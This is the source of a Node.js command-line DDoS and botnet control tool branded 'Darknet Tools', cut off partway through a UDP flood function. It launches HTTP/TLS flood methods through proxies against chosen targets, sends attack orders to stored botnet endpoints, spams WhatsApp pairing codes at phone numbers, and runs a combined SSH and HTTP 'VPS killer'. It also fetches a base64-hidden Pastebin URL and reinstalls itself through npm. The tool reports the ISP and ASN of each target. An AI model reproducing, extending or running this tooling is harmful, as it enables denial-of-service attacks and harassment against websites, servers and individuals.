#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = 'requeire(cheros)'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
          \x1b[38;5;201m╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗\x1b[1m
          \x1b[38;5;201m║║║║╣ ║  ║  ║ ║║║║║╣\x1b[1m
          \x1b[38;5;201m╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝\x1b[1m
  \x1b[38;5;201m╚══════════════════════════════════╝\x1b[1m
\x1b[38;5;201m╔══════════════════════════════════════╗\x1b[1;37m
      OWNER      : V3Real
      Telegram   : t.me/V3Real
      Group      : T.me/Darknetpublick
\x1b[38;5;201m╚══════════════════════════════════════╝\x1b[0m
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i ssh2`);
    console.log(`|| ▓▓░░░░░░░░ || 20%`);

    const encodedURL = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0R2VWZtazBS';
    const decodedURL = Buffer.from(encodedURL, 'base64').toString('utf8');
    const getLatestcheros = await fetch(decodedURL);

    const latestVersion = await getLatestcheros.text();
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);

    if (version === latestVersion.trim()) {
      console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
      await scrapeProxy();
      console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`);
      await scrapeUserAgent();
      console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`);
      await sleep(700);
      console.clear();
      console.log(`Welcome To Darknet Tools 7.0.0`);
      await sleep(1000);
      await banner();
      console.log(`Type "help" For Showing All Available Commands`);
      sigma();
    } else {
      console.log(`Error => ${latestVersion.trim()}`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`Are You Online?`);
  }
}
// ====== //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: tls <target>  <port> <duration>
tls https://google.com 433 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
Status   : \x1b[38;5;160mAttack Has Successfull Launched\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
	sigma()
 } else if (methods === 'httpx') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 9 3 proxy.txt`)
          sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'bypass') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
      sigma()
      } else if (methods === 'bomb') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
        sigma()
        } else if (methods === 'black') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
          } else if (methods === 'crot') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'pluto') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'harder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
          sigma()
         } else if (methods === 'hitam') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
          } else if (methods === 'tlsv2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
          sigma()
          } else if (methods === 'mixed') {
       pushOngoing(target, methods, duration)
const glory = path.join(__dirname, `/lib/cache/glory`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const harder = path.join(__dirname, `/lib/cache/harder`);
        exec(`node ${glory} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${harder} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
function methodsss() {
    
    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));

    console.log(`                          Methods`);
    console.log(` NAME      │ DESCRIPTION                                   │ DURATION`);
    console.log(`───────────┼───────────────────────────────────────────────┼──────────`);

    methodsData.forEach(method => {
        console.log(
            `${method.name.padEnd(10)} │ ${method.description.padEnd(45)} │ ${method.duration.padEnd(5)}`
        );
    });
}

// Logika untuk menjalankan perintah
const command = process.argv[2]; 
// ===========================================//
async function Botnethitam(args) {
    if (args.length < 3) {
        console.log(`Example: botnet <target> <duration> <methods>
botnet https://google.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // Load botnet data
        try {
            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Kirim permintaan ke setiap endpoint
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error sending request to ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // Simpan endpoint yang valid kembali ke file
        botnetData.endpoints = validEndpoints;
        try {
            fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            sigma();
        }

        // Tambahkan proses ke daftar proses aktif
        const endTime = Date.now() + duration * 1000;
        processList.push({
            ip: result.query,
            target,
            startTime: Date.now(),
            endTime,
            duration,
            methods,
        });

        // Cetak detail serangan
        console.clear();
        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
Target Detail
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m ${methods} \x1b[1;37m]
\x1b[1;37m      Server:     [\x1b[1m\x1b[36m ${successCount} \x1b[1;37m]
\x1b[1;37m  Server Details
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:         [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
`);
        sigma();
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: add-server <endpoints>
add-botnet http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
// [========================================] //
async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000); // Waktu dalam detik sejak serangan dimulai
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}
// ===========~=~=~=~=~=~=~=~=~=~==~~=~=~//
async function SpamPair(args) {
  if (args.length < 2) {
    console.log(`Example: pairing <target> <duration> 
pairing 6281111111111 500`);
    sigma();
	return
  }
const [targetNumber, spamAmount] = args
try {

console.log(`Attack Detail
 - Target   : [ ${targetNumber} ]
 - Duration : [ ${spamAmount} ]
 - Methods  : [ Spam Pairing Code ]
`)
} catch (error) {
  console.log(`Error`)
}

const metode = path.join(__dirname, `/lib/cache/17`);
exec(`node ${metode} ${targetNumber} ${spamAmount}`)
sigma()
};
// [========================================] //
async function pod(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ping <target> <duration>
kill-ping 123.456.789.10 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`Target Detail
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m kill-ping \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/18`);
exec(`node ${metode} ${target} 66507 6 1 ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : V3 And Joseph`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/14`);
const ninja = path.join(__dirname, `/lib/cache/3`);
const ssh = path.join(__dirname, `/lib/cache/19`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${ninja} http://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <dur
